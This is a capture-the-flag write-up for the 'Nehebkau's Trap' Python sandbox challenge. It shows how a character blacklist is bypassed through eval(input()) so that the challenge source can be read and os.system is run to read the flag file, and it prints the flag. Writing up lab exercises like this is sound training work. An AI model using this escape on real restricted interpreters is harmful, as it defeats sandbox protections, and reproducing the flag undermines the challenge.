@@ -1,0 +1,117 @@
+$ python3 Nehebkaus_Trap.py 
+    __
+   {00}
+   \__/
+   /^/
+  ( (
+   \_\_____
+   (_______)
+  (_________()Ooo.
+
+[ Nehebkau's Trap ]
+
+You are trapped!
+Can you escape?
+> print(dir())             # dir() is one of the first thing to watch in a python sandbox escape chall
+
+[*] Input accepted!
+
+['banned', 'inp']
+
+> print(dir(inp))
+
+[*] Input accepted!
+
+['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isascii', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'removeprefix', 'removesuffix', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
+> print(dir(banned))
+
+[*] Input accepted!
+
+['__add__', '__class__', '__class_getitem__', '__contains__', '__delattr__', '__delitem__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__gt__', '__hash__', '__iadd__', '__imul__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__reversed__', '__rmul__', '__setattr__', '__setitem__', '__sizeof__', '__str__', '__subclasshook__', 'append', 'clear', 'copy', 'count', 'extend', 'index', 'insert', 'pop', 'remove', 'reverse', 'sort']
+
+#Also checking for globals() is rlly important in this case we will see banned chars
+
+> print(globals())
+
+[*] Input accepted!
+
+{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7fb05521d450>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/sand_xcaper/python_sand/HTB_CyberApoc_2023/Nehebkaus_Trap.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'time': <module 'time' (built-in)>, 'BLACKLIST': ('.', '_', '/', '"', ';', ' ', "'", ','), 'Color': <class '__main__.Color'>, '_print': <function _print at 0x7fb0552860e0>, 'banner': <function banner at 0x7fb055286440>, 'loop': <function loop at 0x7fb0552864d0>, '_': 3}
+
+'''
+'BLACKLIST': ('.', '_', '/', '"', ';', ' ', "'", ',')'
+'''
+
+Here the trick is using print(eval(input())), input() will be read that way but there we can insert also blacklisted chars that will not be checked.
+
+As shown we can reveal the source code of the challenge:
+
+> print(eval(input()))
+
+[*] Input accepted!
+
+open(__file__,"r").read()  
+#!/usr/bin/env python3
+import sys
+import time
+
+BLACKLIST = ('.', '_', '/', '"', ';', ' ', "'", ',')
+
+class Color:
+  WHITE = '\033[37m'
+  RED = '\033[31m'
+  BLUE = '\033[94m'
+  GREEN = '\033[92m'
+  BOLD = '\033[1m'
+
+def _print(s):
+  for c in list(s):
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.015)
+
+def banner():
+  print(f'{Color.RED}{Color.BOLD}'
+        '    __\n'
+        '   {00}\n'
+        '   \__/\n'
+        '   /^/\n'
+        '  ( (\n' 
+        '   \_\_____\n'
+        '   (_______)\n'
+        '  (_________()Ooo.')
+
+  _print(f'{Color.BLUE}\n'
+         "[ Nehebkau's Trap ]\n"
+         f'{Color.WHITE}\n'
+         'You are trapped!\n'
+         'Can you escape?\n')
+
+def loop():
+  inp = input('> ')
+  banned = [c for c in BLACKLIST if c in inp]
+  if len(banned):
+    print(f'\n{Color.RED}[!] Blacklisted character(s): {banned}{Color.WHITE}\n')
+    return
+  print('\n[*] Input accepted!\n')
+  try: eval(inp)
+  except Exception as e: print(f'Error: {e}\n')
+
+if __name__ == '__main__':
+  banner()
+  for _ in range(10): loop()
+  print(f'{Color.RED}[!] The walls crush you!')
+
+
+And now let's grab the flag, from the source code we can see that our input will be passed to eval(),
+this is important because we cannot do something like import os;os.system("cat flag.txt"), this will work if our input would be passed to exe...
+A smart move will be import os in this way __import__("os")
+
+> print(eval(input()))
+
+[*] Input accepted!
+
+__import__("os").system("cat flag.txt")
+HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}
+
+
+Flag: HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}
